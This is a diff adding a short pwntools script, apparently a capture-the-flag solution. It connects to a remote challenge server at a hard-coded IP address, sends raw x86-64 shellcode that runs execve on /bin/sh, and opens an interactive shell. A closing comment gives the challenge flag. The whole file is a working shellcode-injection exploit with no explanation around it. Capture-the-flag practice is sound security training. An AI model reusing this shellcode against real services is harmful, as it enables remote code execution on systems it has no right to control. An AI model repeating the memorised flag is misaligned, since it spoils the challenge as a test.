@@ -1,0 +1,14 @@
+from pwn import *
+
+script = '''
+b *main
+breakrva 0x13E0
+'''
+
+p = remote("103.69.97.144", 6071)
+
+shellcode = b"\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x50\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05"
+p.sendlineafter(b"bytes):\n", shellcode)
+
+p.interactive()
+#BKSEC{ju$7_A_5imPLE_ShelLCODE}
